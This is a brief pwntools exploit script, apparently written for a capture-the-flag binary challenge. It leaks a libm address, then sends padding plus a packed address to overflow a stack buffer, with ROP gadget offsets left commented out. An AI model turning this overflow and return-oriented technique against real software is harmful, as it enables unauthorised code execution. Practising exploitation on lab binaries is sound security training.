#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def exploit(p,e,r):
    pad = b"A" * 16
    p.recvuntil(b"0x")
    libm_leak = int(p.recvline().strip(b"\n"), 16)

    libm_base = libm_leak
    log.info(f"Leaked libm base: {hex(libm_base)}")
 
    # Remote libm 

    #libm_base = libm_leak - 0x17f20
    #pop_rax = libm_base + 0x1a3c8
    #syscall = libm_base + 0x3f39
    #libm_test = libm_base + 0x19b28

    chain = p64(libm_base)

    p.sendline(pad + chain)
    p.interactive()

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)


    exploit(p,e,r)
